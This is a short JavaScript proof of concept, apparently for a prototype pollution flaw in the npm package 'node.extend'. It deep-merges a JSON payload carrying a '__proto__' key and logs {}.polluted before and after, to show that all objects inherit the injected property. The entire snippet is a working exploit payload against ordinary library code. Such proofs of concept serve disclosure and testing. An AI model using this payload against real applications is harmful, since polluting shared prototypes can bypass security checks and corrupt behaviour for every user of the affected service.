var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
let extend = require('node.extend');
var obj = {};
console.log({}.polluted);
extend(true, obj, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);